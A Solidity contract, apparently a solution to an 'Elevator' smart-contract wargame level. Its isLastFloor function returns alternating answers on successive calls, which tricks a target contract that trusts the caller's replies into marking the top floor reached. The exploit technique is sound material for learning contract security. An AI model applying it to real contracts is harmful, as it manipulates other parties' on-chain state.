// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IElevator {
    function goTo(uint _floor) external;
}

contract FlipElevator {
    // event Response(bool success, bytes data);
    uint256 counter = 1;

    function isLastFloor(uint256 floor) external returns(bool res) {
        counter++;
        res = (counter & 1) == 1;
    }

    function ToTheMoon(address elevator, uint256 top) public {
        IElevator(elevator).goTo(top);
        // (bool success, bytes memory data) = elevator.call(abi.encodeWithSignature("goTo(uint256)", top));

        // emit Response(success, data);
    }
}